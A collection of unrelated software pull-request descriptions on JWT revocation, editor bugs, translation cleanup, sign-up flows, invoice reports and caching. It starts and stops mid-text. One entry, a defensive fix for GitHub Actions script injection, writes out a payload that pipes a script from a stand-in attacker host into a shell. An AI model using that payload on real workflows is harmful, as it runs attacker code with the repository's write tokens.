A missing `iat` is treated as 0, which is at or before every horizon, so such a token is rejected once a horizon exists. That mirrors the missing-`token_version`-is-0 convention already documented at both sites. A non-numeric `iat` gets the same treatment, which is not paranoia: PyJWT validates `iat` by casting a copy, so a numeric string survives into the payload, and comparing it directly would raise `TypeError` out of the dependency instead of refusing the token.

There are two clock sources. `iat` comes from the API process clock, the horizon from the DB clock. An API clock running ahead could lift a pre-logout token's `iat` past the horizon and slip this check. That token still dies on the `token_version` bump, which is why the bump is retained rather than replaced. On the refresh side there is no skew axis at all, because `refresh_tokens.created_at` and the horizon both come from `now()` on the same server.

`GREATEST` keeps the horizon monotonic: a DB clock that steps backwards must not resurrect credentials an earlier revocation already killed. `COALESCE` is not redundant next to it. Postgres `GREATEST` happens to ignore NULLs, but the SQL standard propagates them, and correctness here should not rest on which behaviour we get.

**The `iat` rounding rule, and the constraint it carries.** PyJWT writes `iat` as truncated integer seconds, so the claim does not name an instant, it names the interval `[iat, iat+1)`. The rounding has to go one way or the other, and this rejects only when that whole interval precedes the horizon: `iat + 1 <= horizon`.

That is a deliberate change from the design doc, which specified `iat <= int(horizon)`. Rounding the other way rejects any token minted in the *same second* as the revocation, and that is not a theoretical cost: it made `test_a_rotation_racing_logout_never_leaves_a_live_session` fail intermittently, with `iat=1786618628` against a horizon of `1786618628.02`, so a token minted after the revocation was refused. A control run on `origin/main` with the same file pairing is green, confirming the change caused it rather than a pre-existing flake. In product terms it meant logging out and immediately logging back in left a dead access token for up to a second.

Rounding this way gives up nothing, because the same-second region is covered by the `token_version` bump that the same UPDATE makes. The horizon is the revoking transaction's `now()`, so a token minted before that UPDATE commits necessarily read the pre-bump version under READ COMMITTED and dies on the version check, while one minted after it commits carries the new version and legitimately lives. That is the same composition the design already relies on for API-vs-DB clock skew.

The coupling is the part worth flagging, because it is invisible from the comparison itself: **the same-second region is covered by the bump alone, so removing or weakening that bump requires tightening this rounding back to `<=` in the same change.** It is written as a constraint at both ends, on `_predates_revocation_horizon` and on the bump in `revoke_all_tokens`, since a refactor would arrive at the latter. A test pins the rounding in both directions.

The post-lock re-check in `rotate_refresh_token` deliberately does not re-read the horizon. Any revocation that stamps a horizon also revokes every unrevoked row visible to it, so a rotation that loses the lock race finds `revoked=True` in the re-check it already performs. A third check would restructure a query the design says to leave alone, for a case the existing one covers.

All three revocation sites inherit the horizon through `revoke_all_tokens`: logout, password change, and now the SAML conversion. Role change deliberately does not, because it bumps `key_epoch` only. The horizon means "log every session out", not "refresh your claims", and a test pins that.

The download-token lane is untouched and out of scope. `?token=` downloads are verified by their own handler in `router_export.py`, which checks neither `token_version` nor the horizon. That is pre-existing behaviour, bounded by the 120s TTL cap on those tokens, and not what #1455 asks for.

The residual is #1459, restated here because it is the one thing a reader should not have to discover: a login whose transaction begins inside the revoking transaction is classified as a successor by a transaction-timestamp comparison, even though it read pre-revocation state. A timestamp cannot separate those two cases, which is why the follow-up proposes the `token_version` marker rather than a tighter clock.

Deliberate non-changes: no per-session or per-device revocation, because logout revoking everything as of its instant is what makes it a security event and what SEC-S15 builds on; no removal of the

author: meshmulla
body:
## Bugs fixed

**1. Every example loaded Hello World.** `handleLoadExample` called `setCode(example.code)` and then `initialize()` — but `initialize()` resets the code back to the default template. So the code you just set was immediately overwritten. Now uses a new `resetResults()` store action that clears compilation/execution state *without* touching the code.

**2. The editor never showed loaded code.** `EditorPane` pushed the store's code into Ace only once, on mount (`[]` deps). Even with bug #1 fixed, loading an example updated the store but not the visible buffer. Added a guarded effect that syncs store → editor when they differ (guard prevents a feedback loop with Ace's own change handler).

**3. Ace lifecycle.** The unmount cleanup removed the injected `<script>` tag (leaving the editor instance/DOM alive → leak) which also broke re-mounts because `window.ace` was already defined. Now destroys the editor instance, reuses the CDN script across mounts, guards against double-init, and reads the initial code from the store to avoid a stale closure.

## Commits
- `feat(store)`: add `resetResults` (clear results, keep code)
- `fix(examples)`: stop loading Hello World for every example
- `fix(editor)`: destroy Ace on unmount instead of removing its script
- `fix(editor)`: reflect store code changes in the editor

author: florianriquelme
body:
Resolves #17. Grilling session; one section added to `docs/findings/0002-second-run.md`, plus a
`What held` bullet and a routed consequence. No code.

## What the grill found

#17 asked whether Enqueue should require a `ce-unified-plan/v1`-shaped Anchor. **The premise was
stale.** Run 2's Anchor was already `ce-unified-plan/v1`, and the Run promoted it in place — which
snapper#28 had named as a watch item and `findings/0002` never answered.

| | `artifact_readiness` | files under `docs/plans/` in the diff |
|---|---|---|
| snapper `main` | `requirements-only` | — |
| the Run's branch, [snapper PR #30](https://github.com/FlorianRiquelme/snapper/pull/30) | `implementation-ready`, plus a new `planned: 2026-08-06` | **one** — the Anchor itself |

So `CONTEXT.md`'s *"readiness-promoted by the Run"* is demonstrated rather than aspirational, on the
harder of the two Jobs, and the deviation snapper#27 was written to prevent did not recur.

## What that settles

- **Enqueue requires no Anchor shape.** The compliant case needs nothing; the non-compliant case is
  a second target repo that does not exist.
- **The shape's gain is in the PR body, not the plan.** Run 1's legacy Anchor had `ce-plan` derive 16
  R-IDs into a second document and none reached the PR body; Run 2's Anchor authors R1–R36 and the PR
  body walks all 36. Commented on #4 — its proposal 2 shrinks to *probably nothing* at n=1.
- **#17's fourth bullet read the wrong ADR.** An Anchor-shape rule is an **admission check**, not a
  capability, so neither ADR-0002 nor ADR-0003 forbade it. It simply buys nothing.
- **Scope: software tasks only, but any kind of software task.** Non-diff work is refused by `lfg`'s
  own step-1 gate, not by Grind's narrowness.

No ADR — nothing here is hard to reverse, and the decision is *keep doing what we already do*. No
glossary change; `CONTEXT.md` already said the right thing.

## Routed out

[#63](https://github.com/FlorianRiquelme/grind/issues/63), where the grill found something actually
wrong rather than merely absent: nothing verifies the Anchor file **exists**, so a mistyped path
dispatches cleanly and the Run can invent requirements and satisfy them; and
`attempt::dispatch_prompt` asserts *"this slice is transcription, not design"* as a **constant** for
every Run — accidentally true twice, and opposed to the scope settled above. It becomes an optional
`| Intent |` Job row whose default is silence.

The map's Decisions-so-far entry is written and #63 is linked as a sub-issue of #5.

author: mdkacode
body:
A technician tells their day to a chat thread — typing, a voice note, a photo of the bay — and it becomes a record their manager reads over one email.

```
their own "Daily Status" room     18:45 nudge        20:00 generate         20:20 digest
text · voice · photo · ticket  →  3 questions,   →   ONYX organises,   →    one email per depot,
                                  push, only if      fallback if not        blockers hoisted
                                  they're silent
```

## Why capture is a chat room, not a form

Each reporting user gets a `Status`-kind room with exactly one member: themselves. The Android app needs **no change** to capture — it is an ordinary room, so unread badges, voice notes, the offline cache and search already work. With the reminder on, the loop closes without an app release.

## Load-bearing properties

- **Ordering is `seq`, never a timestamp** — the rule the rest of chat runs on. A day covers `(from_seq, to_seq]` starting where yesterday stopped, so a message sent at 23:50 after the digest went out is carried into tomorrow rather than lost. Tested both ways.
- **Idempotent on (user, date)**, enforced by a unique `dedup_key` column. A duplicated cron firing cannot produce two rows.
- **AI is an improvement, never a dependency.** Four fallback paths — AI off, ONYX unreachable, unparseable reply, empty summary. Every one still records the day, still counts the person, still emails.
- **Grounding.** Ticket and vehicle ids from the model are checked against what the person actually referenced that day, so an invented plate number never reaches a record a manager acts on.

## ONYX

`POST https://ai.naarni.com/api/chat/send-chat-message`, `stream: false`, `allowed_tool_ids: []` (no RAG — otherwise it cites unrelated corpus documents inside a shift summary), `include_citations: false`. Works with either an API key (`on_…`) or a PAT (`onyx_pat_…`). Circuit breaker opens after 3 failures for 15 minutes.

Verified live end to end. Three Hinglish messages in:

> Subah PM kiya bus 4102 ka, oil aur filter dono change ho gaye / compressor se leak hai, spare nahi hai, kal tak ruka hua hai / wheel alignment done on the second bus

produced `[Completed] Oil and filter changed on bus 4102`, `[Completed] Wheel alignment done on the second bus`, `[Blocker] Compressor leak on bus 4102, no spare available, work stopped until tomorrow` — with the blocker hoisted into the digest banner.

## Tests

31 new tests, plus the 101 existing chat tests still green. None touch the network; the AI tests inject the answer, so a flaky link never makes the suite red.

## Deploy notes

- **Ships off.** `Daily Status Settings.enabled` defaults to 0 and the seed patch never overwrites a human's choice. The first thing enabling does is start messaging every technician on the floor, so that stays a deliberate switch.
- Adds an `ONYX_API_KEY` step to `deploy-azure.yml`, mirroring the existing FCM pattern. **The `ONYX_API_KEY` repo secret still needs to be created** — until then the step is a no-op and ONYX stays off in prod.
- Confirm `System Settings.time_zone` is `Asia/Kolkata`; the three crons are written for IST, same caveat the KM report carries.
- Branched off `develop` rather than `feat/chat-module` so the 30 unmerged chat-UI/Android commits stay out of production. Every chat field this depends on (`last_seq`, `transcript`, `duration_ms`, `chat_feed.post`) is already on `develop`.

`assets/translations/ja.json` / `en.json` に残っていた、コード側から一切参照されていない翻訳キー53件を両ファイルから削除しました。廃止済み機能（位置情報の配信、旧経路検索UIなど）や未実装画面（チューニング画面）の残骸が中心です。

## 変更内容

削除したキーは以下の53件です（ja/en 両方から同じキーを削除）。

| 分類 | キー |
| ---- | ---- |
| 位置情報の配信（機能ごと廃止） | `connect`, `publisherNotFound`, `publishShareText`, `publishProhibited`, `publisherNotReady` |

| 列車種別のフォールバック名 | `rapid`, `rapidEn`, `rapidZh`, `rapidKo`, `tyRapidEn`, `tyRapidZh`, `tyRapidKo`, `ltdExp`, `ltdExpEn`, `ltdExpZh`, `ltdExpKo` |
| 経路検索・駅リストの旧UI | `routeSearchTitle`, `searchDestinationPlaceholder`, `searchByStationNamePlaceholder`, `stationListEmpty`, `matchedStationListEmpty`, `savedRoutesEmpty`, `selectFirstStationTitle`, `routeListTitle`, `trainTypesFilter`, `trainTypeSettings`, `allStops`, `communityRoutes` |
| オートモード・権限・その他 | `setAutoModeText`, `legacyAutoModeTitle`, `setTerminusText`, `alwaysPermissionRequired`, `permissionsNotGranted`, `notificationNotGranted`, `couldNotGetLocation`, `loadingLocation`, `loadingAPI`, `awaitingLatestData`, `menuNotice`, `warning`, `autoAnnounceItemTitle`, `themeConfirmTitle`, `telemetrySettingWillPersist`, `walkthroughSwipeHint`, `trainTypeIs`, `passingStation`, `passStationLabel` |

### 検出方法と、誤削除を避けるために確認したこと

`src/` 配下657ファイルを走査し、各キーが `'key'` / `"key"` / `` `key` `` のいずれの形でも出現しないものを未使用と判定しました。その上で、静的検索では拾えない動的参照を個別に確認しています。

- `src/components/TrainTypeBox.tsx` がテンプレートリテラルでキーを組み立てています（`` translate(`${localTypePrefix}${localKey}En`) `` など）。`localTypePrefix` に渡る値は `''` と `'ty'` の2種類のみ（`src/components/HeaderEast/config.ts`）で、`localKey` は `'Local'` / `'local'` のため、生成されうる `local`, `localEn`, `localZh`, `localKo`, `tyLocal`, `tyLocalEn`, `tyLocalZh`, `tyLocalKo` の8件は保護対象として削除していません。
- `WalkthroughOverlay` の `step.titleKey`、`utils/themeInfo.ts` の `descriptionKey`、`useRefreshStation` の `bodyKey` も変数経由の参照ですが、いずれも代入元が文字列リテラルのため通常の検索で捕捉できています。
- `rapid` と `passStationLabel` はテストファイルからのみ文字列がヒットしましたが、前者は `deepLinkTrainType.test.ts` のディープリンク値（`['小文字', 'rapid']`）、後者は `PortraitMain.test.tsx` の「通過ラベルが表示されないこと」を確認するアサーションで、どちらも翻訳キーとしての使用ではないため削除対象に含めています。
- `translate()` 以外の経路で翻訳を引いている箇所がないことも確認しました（`i18n.t` の呼び出しは `src/translation.ts` のみ）。

削除後に同じスクリプトを再実行し、未使用キーが0件になることを確認しています。

## テスト

`npm run lint` / `npm test` / `npm run typecheck` をローカルで実行し、いずれも成功することを確認しました（`npm test`: 227スイート・2424テストすべてPASS）。

- [x] `npm run lint` が通ること
- [x] `npm test` が通ること
- [x] `npm run typecheck` が通ること

### リグレッションリスク

削除したキーはいずれもコードから参照されていないため、実行時に影響する経路はありません。想定される唯一のリスクは「静的検索で捕捉できない動的参照を見落として削除してしまう」ケースですが、上記のとおり動的にキーを組み立てている箇所は `TrainTypeBox.tsx` の1系統のみで、そこで生成されうるキーは保護しています。

なお、今回の調査で `local2`（`TrainTypeBoxJO.tsx` / `TrainTypeBoxJL.tsx` で使用中）が ja.json にしか存在しないことが判明しています。端末言語が英語の場合にこのキーが解決できない既存の不具合ですが、本PRのスコープ外のため手を付けていません。別途対応します。

author: aweingarten
body:
## The class

`${{ }}` is substituted into the script **before the shell parses it**, so an interpolated value is not data — it is *syntax*. A `workflow_dispatch` input of

```
v1"; curl evil.sh | sh #
```

interpolated into `run: llz upgrade --ref "${{ inputs.ref }}"` executes the curl, with whatever the job's token can reach.

## Why a guard and not just a fix

A template-upgrade workflow (#437) shipped with exactly that shape, in a job holding a PAT with `contents:write`, `pull-requests:write`, `workflows:write`. I then explained the cause three times as *"actionlint doesn't scan `instance-template/`"*. **Both halves of that were wrong**, and I only found out by running it:

- `instance-test` **does** lint the rendered instance workflows.
- `actionlint` **exits 0** on the injection anyway — measured, on the exact shape.

So the class was undetected in *both* trees, and the remedy is a guard rather than a config change.

## Four were live on `main`, all in delivered files

| File | |
|---|---|
| `llz-scheduled-checks.yml` | `llz drift --branch "${{ inputs.drift_branch }}"` |
| `llz-bootstrap-openbao.yml` | `--instance-repo "${{ inputs.instance_repo }}"` |
| `llz-bootstrap-openbao.yml` | `--hint "…github.com/${{ inputs.instance_repo }}.git…"` |
| `llz-terraform.yml` | `--hint "…github.com/${{ inputs.instance_repo }}.git…"` |

The first is the sharpest: `drift_branch` is a free-text `workflow_dispatch` input. All four now route through `env:`, where the shell expands them after parsing and they cannot become syntax.

`llz ci workflow-injection` is clean at 29 workflows and joins `llz ci gates`, so it runs on every PR.

## Scope is deliberately the unambiguous half

Flags `inputs.*` and `github.event.*` — set by whoever dispatches or calls the workflow, and by whoever opened the pull request. GitHub's own hardening guidance names the second.

**Not** `needs.*.outputs.*` / `steps.*.outputs.*`. Those are a real second tier — a step that echoes external data launders it into an output — and there are seven such sites today, all carrying values this repo computes. Widening belongs in its own change with its own paydown. A guard that fires on `vars.TF_IMAGE` gets switched off within a week, and takes the class back into invisibility with it.

## Tests

The real injection shape · `github.event.*` · the `env:` fix **passing** · repo-controlled contexts **not** firing · `github.repository` not being mistaken for `github.event` · an empty corpus failing closed · an unparseable workflow being an error rather than a silent skip.

The failure message carries the remedy inline — an operator who cannot see the fix reaches for a suppression instead.

## Risk

Low and self-contained. One new gate, four delivered workflows edited mechanically (`${{ x }}` → `env:` + `"$X"`), no behaviour change. Verified: `make lint` 0 · `staticcheck` 0 · `make coverage` 0 · `make test-race` clean · `go test ./...` clean under `GITHUB_ACTIONS=true` · `llz ci gates` 27/27.

body: ## Bug `GET /v1/memory/search` (and `/v1/memory/archive/search`) return **500 on any page that has at least one result**. Empty result pages return 200, which is why it went unnoticed — the memory-platform web surface cannot render real search results at all (#11438). ## Root cause Both routes declare `response_model=ProductMemorySearchResponse`, whose `items` was typed `List[MemoryItem]`. Neither route ever emits `MemoryItem` rows. Both read seams — `_product_memory_result` in `backend/utils/memory/memory_read_api.py` and the universal projection in `MemoryService.default_product_search` — emit the same 15-key projection (`memory_id`, `memory_layer`, `tier`, `content`, `lifecycle_status`, `processing_state`, `confidence`, `visibility`, `visibility_source`, `source`, `date`, `evidence`, `agent_use`, `access_reason`, `superseded_by`). `MemoryItem` requires `version`, `uid`, `status`, `source_state`, `sensitivity_labels`, `user_asserted`, `captured_at`, `updated_at` — none of which the projection carries, so FastAPI response validation raised on every row. The existing router suite (`backend/tests/unit/test_product_memory_router.py`) stubs `fastapi` out entirely and calls the endpoint functions directly, so it never executed response validation and stayed green through the whole outage. ## Fix - New `ProductMemorySearchItem` models the projection the routes actually emit; `ProductMemorySearchResponse.items` (and, by inheritance, the archive response) is typed on it. `extra='allow'` so a projection gaining a field is not silently dropped from the wire. - `VectorMemorySearchResponse` keeps `List[MemoryItem]` — it dumps real `MemoryItem` records and was never affected. - Regression test serializes a real projection through a real FastAPI route, so the framework's own response validation runs. ## Tested Backend canonical venv (`backend/.venv`, python 3.11, locked fastapi/pydantic): - `pytest tests/unit/test_product_memory_search_response_contract.py tests/unit/test_product_memory_router.py` → **21 passed** - Same new test with `models/memory_product.py` reverted → **2 failed, 1 passed**: the populated default page and the populated archive page 500 with `ResponseValidationError` (`{'type': 'missing', 'loc': ('response', 'items', 0, 'version')}`, …), the empty page passes — reproducing the reported symptom exactly. - `make preflight` (local lane, 10 manifest checks) → passed; bounded pre-push gate → passed. Not run: the full `PROVIDER_MODE=offline make dev-up` harness the issue used. The regression test drives the same seam that 500s — the real projection through the real response model behind a real FastAPI route. Fixes #11438 Failure-Class: new 🤖 automated by hourly watchdog — tested and merged

author: rlomelino1
body:
Design **22b**. Renewal reminders have been built, deployed and scheduled since v28 and have **never sent an email** — `remind_before_days` starts null on every subscription and the only control is a button three taps deep on the detail screen. This is the discoverable entry point.

## The shape

The offer appears at the **first confirmation**, the first moment there is something concrete to be reminded about.

- **The confirmed row is replaced in place**, not animated away. It becomes a confirmation card — *"ChatGPT Plus is now tracked · Monthly · renews Aug 07 · ~R$ 112,40"* — with the offer nested inside. The queue above stays untouched and actionable.
- **It lands after the R4 interval sheet**, never beside it. A single-charge suggestion still asks monthly/annual first and the card shows the answer; R3 skips the middle step. The offer is not a sheet, so nothing stacks.
- **Answering collapses the card to its header** and leaves it for the rest of the visit. Next visit the row is gone — review lists `possible` runs, and a confirmed one has moved to the Subs tab.
- **Dates render bare.** The mockup drew "renews ~Aug 05"; the tilde is amounts-only, locked 2026-07-15.
- **Copy states only what the pipeline keeps**: *"One email, 2 days before the expected charge — sent to the address you signed in with."* No implied push — push is in the schema and deliberately unbuilt.

## "We won't ask again", stored asymmetrically

The two answers are not symmetrical, so they are not stored the same way:

- **Yes** is durable in the database. The subscription now carries a `remind_before_days`, so `remindersNeverUsed` is false on every device, forever.
- **No** writes **nothing** — declining must not leave a mark on a row the user did not ask to change — so it is a local flag.

A `profiles` column would make the decline durable across devices at the cost of a migration **and** an extension of Migration #1's column-scoped UPDATE grant. For a single-user app the failure mode is that a reinstall asks once more, and the question is one tap to decline.

## The trigger

**"Reminders have never been used"**, not "this is the first tracked subscription". R1 auto-confirms without anyone tapping anything, so the latter would silently never fire for a user who arrives with eight subscriptions already tracked. A reminder on a *dismissed* subscription counts too: the question is whether the user has met the feature, not whether the row is still visible.

## Tests

30 UI tests, 8 unit suites. New: the offer appearing on a first confirmation and collapsing on either answer, not returning for a second confirmation in the same session, and the payload rule including the dismissed-subscription and reminder-turned-back-off cases. UI tests pass `--fresh-reminder-offer`, since `UserDefaults` survives between launches of one install and would otherwise make a second run behave differently from the first.

Spec: v36 section plus changelog. `22b.png` added to the mockups.

author: devkaylab
body:
Implémente le parcours d'inscription cible : demande → validation Quantinvo → devis → facturation → codes → validation des superviseurs → équipes.

Migrations et edge functions **appliquées et déployées sur le projet live** (`inventaire-smartcount`), selon la convention du dépôt.

---

## Ce qui manquait

L'inscription était en libre-service. `handle_new_user` attribuait le rôle `supervisor` à quiconque s'inscrivait sans invitation, puis `join_store` permettait de s'auto-affecter à un magasin avec son code. Aucune demande, aucune validation, aucun volet commercial en base.

## 1. Entreprise

Formulaire public `/inscription` (nom, contact, **nombre de magasins**) → `company_requests`.

Séquence imposée en base, pas seulement dans l'UI :

```
pending → quoted → accepted → paid → created
```

`admin_set_company_request_status` refuse toute transition hors séquence, et `admin_fulfil_company_request` refuse de créer tant que le statut n'est pas `paid`. La création génère l'entreprise, ses N magasins et tous les codes en une fois, et les affiche à l'administrateur pour transmission.

C'est désormais le **seul** chemin de création d'entreprise.

## 2. Superviseur

Formulaire public `/superviseur`, **code magasin obligatoire**. Le code est résolu au dépôt : la console admin affiche directement l'entreprise et le magasin concernés — rien à rechercher. Le code n'est pas stocké en clair.

À la validation, l'edge function `invite-supervisor` déclenche l'invitation Supabase. La personne choisit son mot de passe ; `handle_new_user` crée alors le profil superviseur, rattaché à l'entreprise et **affecté au magasin de la demande**. Le mot de passe n'est défini nulle part côté serveur.

L'état intermédiaire `approved` (« Mot de passe à créer ») rend l'attente visible dans la console.

## 3. Compteur

- **Prénom et nom séparés** (`profiles`, `team_invitations`), avec backfill des comptes existants depuis `full_name`.
- **Choix des magasins** quand le superviseur en supervise plusieurs (`team_invitations.store_ids`). Vide = tous les siens, ce qui conserve le comportement actuel pour un superviseur mono-magasin. Le serveur revérifie que les magasins choisis lui sont bien affectés.
- **Ajout depuis le dashboard web**, qui renvoyait jusqu'ici vers l'application mobile.
- Le code magasin ne lui est jamais communiqué (`join_code` déjà révoqué en SELECT).

## 4. Contournements fermés

| Porte | Effet | Fermeture |
| --- | --- | --- |
| `create_company` | entreprise + code sans demande ni facture | révoquée à `authenticated` |
| `join_company` | rattachement sur simple connaissance du code | révoquée |
| `join_store` | auto-affectation à un magasin | révoquée — le code accompagne la demande |
| `session_invitations` rôle `supervisor` | fabriquait un superviseur sans validation | profil forcé à `employee` |
| `invite-to-session` | créait un profil pour un inconnu | e-mails sans compte refusés |

`handle_new_user` refuse désormais tout e-mail sans demande validée ni invitation. Seule exception : une base sans aucun profil, pour amorcer le premier administrateur.

## Vérification

Sondages en base avec les rôles réels, transactions annulées (aucune donnée modifiée — tables vérifiées vides après coup) :

**Parcours entreprise**
```
A_DEPOT (anon)                = success
B_DOUBLON                     = refusé
C_ANON_TRAITE                 = REFUSE (42501)
D_CREATION_AVANT_PAIEMENT     = refusé
E_PAID_SANS_DEVIS             = transition impossible
F/G/H devis → accepté → payé  = success
I_CREATION                    = code entreprise + 3 codes magasin
```

**Parcours superviseur**
```
A_CODE_INVALIDE               = refusé
B_DEPOT                       = success, magasin résolu
C_SIGNUP_AVANT_VALIDATION     = REFUSE
D_VALIDATION                  = success
E_PROFIL   = supervisor / Paul Martin / Paul|Martin, 1 magasin, demande → active
F_INCONNU                     = REFUSE
```

`tsc --noEmit` propre côté app et site · 28 + 79 tests verts · `next build` OK (routes `/inscription` et `/superviseur` générées) · aucune nouvelle remontée eslint.

## Hypothèses posées

- **Pas de passerelle de paiement.** Le parcours décrit l'administrateur Quantinvo qui devise, facture et encaisse : c'est modélisé en statuts pilotés par lui. Brancher Stripe plus tard ne demanderait que de renseigner `paid_at` automatiquement.
- **Comptes existants intacts.** Les 8 profils actuels continuent de fonctionner ; seuls les *nouveaux* parcours sont fermés.

## Restes connus

- L'automatisation évoquée pour l'administrateur (création en masse) n'est pas traitée : la console reste manuelle, mais chaque étape est désormais une RPC, donc scriptable.
- Le compteur ressaisit encore son nom à l'inscription : le pré-remplissage réel demanderait un lien magique, comme pour les superviseurs. `handle_new_user` retombe déjà sur le prénom/nom saisis par le superviseur si les champs sont laissés vides.

author: wzin
body:
Reworks the `Opis faktury` column as you asked, and fixes a correctness bug found while verifying it.

## 1. Fixed taxonomy instead of prose

The column was writing full justifications ("Wydatek dotyczy raty leasingowej za sprzęt/pojazd wykorzystywany w działalności…"). It now picks from a configured list, so the same expense reads the same way every month and the column can be sorted and filtered.

Your mappings became the default `excel.categories`: `paliwo`, `usługa telekomunikacyjna`, `meble biurowe`, `elektronika do pracy`, `rata leasingowa za sprzęt`, `naprawy i utrzymanie samochodu`, `wynajem przestrzeni biurowej`, `materiały fotograficzne/poligraficzne`, `narzędzia i materiały biurowe`, `obsługa księgowa działalności`, `usługi związane z wynajmem statku powietrznego`.

**The prompt moved into config**, under `excel.description_prompt` — where you expected it to be. It was hardcoded in `ksef_excel.py` before.

**Verified against the live model on real invoices**, not just fixtures: 6 of 6 replies came back on-list, matching your requested wordings exactly. An off-list reply is kept rather than discarded (losing the classification is worse) but logged as a warning naming the category to add.

## 2. Non-deductible expenses

`excel.non_deductible_keywords` marks costs that can't reduce revenue — sports cards, meals, supplements, toys. Defaults include `multisport`, `benefit systems`, `karta sportowa`, `jedzenie`, `catering`, `restauracja`, `posiłek`, `odżywka`, `suplement`, `zabawka`.

Matching rows are **kept and highlighted red** with `NIE PODLEGA ODLICZENIU`, not removed — nothing vanishes from the accountant's file without trace. Keywords run **before** any API call, so the check is free, deterministic, and works under `--no-ai`. The model can also return the marker for cases no keyword covers.

On your real data the Multisport re-invoice was caught on its line item, and the row stayed in the sheet.

A test caught a subtle bug here: **NFKD does not decompose `ł`** — U+0142 is a distinct letter, not a base plus combining mark — so `posiłek` would never have matched `posilek`. Fixed with an explicit mapping.

## 3. The bug I found while verifying: duplicate rows

While checking the classifier output I noticed every invoice appearing twice. The same invoice legitimately lands on disk twice — once as `..., ksef.pdf` from the download, once as a separately renamed copy — and both parse to the same invoice, so the report listed both.

**On your real corpus that inflated July from 25 rows to 28 and overstated gross by 746.19 PLN.** You would have handed the accountant a wrong total.

Unlike a non-deductible expense, a duplicate carries no information, so it is removed rather than labelled — keyed on invoice identity, preferring the copy with a resolved KSeF number, then a real PDF, with the filename as a deterministic tie-break. Every drop is logged with both filenames. Invoices with no document number are never merged, since an empty key would collapse unrelated rows.

Verified: 28 → 25 rows, total corrected from `24,678.11` to `23,931.92`, zero duplicate identities remaining.

## One thing to check

In your list, film developing ("wywołanie filmów fotograficznych… skanowanie negatywów") appeared inside the block you mapped to **Paliwo**. I read that as a copy/paste slip and left it to `materiały fotograficzne/poligraficzne`. Say so if you actually meant otherwise.

Also worth a look: `jedzenie`, `catering` and `restauracja` as blanket keywords will also catch business meals that may be partly deductible. They're config, so trim the list if that's too aggressive.

## Verification

- `black --check` clean, `flake8` exit 0, **190 tests pass**
- Run end to end on the real corpus under `--no-ai` (keyword pass, zero API calls) and against the live model on a sample
- No real invoice data in the diff — checked against every NIP and counterparty name in the corpus

author: cad0p
body:
## What

The loader's jiti instance (`createJiti(import.meta.url, { moduleCache: false, fsCache: true })`) never used its intended disk cache. jiti's internal `prepareCacheDir` resolves the default cache dir as `pathe.resolve(id, "../node_modules")` — treating the instance id (a FILE path like `<pkg>/src/loader.ts`) as a directory, producing `<pkg>/src/node_modules` (never exists) → silent fallback to `${tmpdir}/jiti`.

Consequences (per #38):
- **Volatile**: `/tmp` is tmpfs — wiped on reboot. Every pi process after boot re-pays the ~1.2s cold jiti/babel transpile of the steering config + ts-shipped plugin sources once (warm loads ~4ms).
- **Unbounded shared dir**: 3,154 stale files observed in /tmp/jiti (every edited config/plugin version leaves a stale cache file forever; shared machine-wide across all jiti users).

## Fix

Pin `fsCache` to `<pkgRoot>/node_modules/.cache/jiti` (jiti's own convention) via `resolveJitiCacheDir(import.meta.url)`, with graceful fallback to `true` (jiti's default → tmpdir, exact status quo) when:
- the id isn't a `file://` URL,
- the package has no `node_modules` dir (never create a stray one),
- the target isn't writable (read-only pnpm store etc.).

`dirname(dirname(path))` maps both `src/loader.ts` (dev/git installs) and `dist/loader.js` (compiled npm installs) to the package root. `false` is never used — that would silently disable the transform cache entirely.

Verified by prototype: cold 1184ms → warm 3.7ms, cache files landing in the package dir, persistent across processes.

## Test matrix

`resolveJitiCacheDir` is exported for tests; new describe block covers: pinned dir + on-disk mkdir side effect, no-stray-node_modules guard, `.cache` blocked by a regular file, non-file URL id, and the `dist/` layout mapping.

## Gates

- `pnpm test` — 1137/1137 pass
- `pnpm typecheck` — pass
- `pnpm lint` — pass (0 errors; warnings pre-existing)
- `pnpm build` — pass
- `pnpm smoke` — 9/9 cases passed

## Release notes

perf: jiti transform cache pinned to package-local node_modules/.cache/jiti — post-reboot first runtime build ~1.2s → ~4ms; fixes #38; closes #36 (skip-with-evidence: warm rebuild ~4ms, memo not worth it).


## Review + e2e verification (2026-08-13)

- Review subagent: **APPROVE** — no FIX-NOW. 2 optional NITs accepted per plan (wiring covered by e2e, `dirname(dirname())` depth assumption covered by the dist-layout test case).
- E2E-lite on the REAL install path (live clone `~/.pi/agent/git/github.com/cad0p/pi-steering` temporarily checked out to this branch, restored to main after):
  - Steering rule fired in a real `pi -p` run: `[steering:block-cachepin-probe@user]` — engine functional on the pinned-cache build.
  - Cache files landed in the package dir: `node_modules/.cache/jiti/steering-index.*.mjs`, `steering-predicates.63513521.mjs` (persistent across processes — verified on disk after the run).
  - No new `/tmp/jiti` pollution from the steering build (the config's transform cache no longer routes there).

author: catchme2
body:
## Summary

- `createErrorHandler` is now aware of routes streaming Server-Sent Events via `@fastify/sse` (including SSE contract routes built with `@lokalise/fastify-api-contracts` >= 6)
- when an error reaches the handler while a stream is live — detected as `reply.sse?.isConnected && reply.raw.headersSent` — the resolved error payload is sent as a terminal `event: error` frame and the stream is closed, since the status line and headers are already committed and a regular error response is impossible
- both detection conditions matter: `@fastify/sse` sets `isConnected` before the route handler runs, so the flag alone is true on every SSE-capable request; only `headersSent` distinguishes an actually started stream, keeping pre-stream errors on regular error responses
- error reporting and logging still run for stream errors; behavior for regular requests is unchanged
- `@fastify/sse` is a devDependency only (used by tests) — apps without the plugin registered are completely unaffected
- README documents the error handler and the SSE behavior

author: melindavandijke
body:
## Purpose

The backend CI job (`test-back`) has been failing on every single run, across all branches, for about two months. Two tests in `test_translation_service.py` (`test_normalize_unknown_falls_back_to_fr` and `test_normalize_empty`) assert that an unknown or missing language code falls back to `"fr"`, but the actual fallback had been changed to `settings.LANGUAGE_CODE` (default `"en-us"` → `"en"`) in a prior commit. The German-translations PR later touched this test file but never noticed the mismatch, so the tests kept failing unnoticed.

## Proposal

Revert `TranslationService.normalize_lang` and `resolve_language` to always fall back to `"fr"` for unknown or missing language codes, restoring the original behavior the still-passing tests expect. Removed the now-unused `_default_language()` helper.

author: punyanagari
body:
## User outcome

Prevents a latent test time bomb: the credit-note integration suite's IRP evidence fixtures carried a frozen `ackDateText: '12/08/2026 14:30:00'` (and frozen `cancelledAtText` literals) alongside dynamically derived ISO instants (`hoursAgo(1)`/`hoursAgo(72)`, `new Date()`). The text and ISO forms disagreed, and the text was already a past date. This is the same defect class hotfixed in `tax-invoices.integration.test.ts` on 2026-08-13 (commit 9aafaf0, PR #44). P7's review of PR #48 flagged the residue in the credit-note suite.

## Scope and non-goals

